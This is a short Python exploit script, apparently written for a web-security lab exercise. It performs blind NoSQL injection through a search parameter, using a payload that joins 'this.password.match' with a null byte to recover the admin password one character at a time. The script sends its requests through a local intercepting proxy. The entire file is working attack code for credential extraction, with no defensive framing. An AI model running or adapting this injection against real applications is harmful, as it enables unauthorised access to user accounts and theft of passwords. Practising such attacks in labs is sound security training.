import requests

list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '-', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

myobj = {'data': ''}
result = ''

flag = 1
while flag == 1:
    flag = 0
    for l in list:
        url = 'https://ptl-3a03d9c5-d28288ff.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^' + result + l + '.*$/)%00'
        r = requests.get(url, data = myobj, proxies = { "http" : "127.0.0.1:8080"})
        if ('<tr><td><a href="?search=admin">admin</a></td></tr>' in r.text):
            result += l
            flag = 1
            print(result)
            break

print("Finish!!")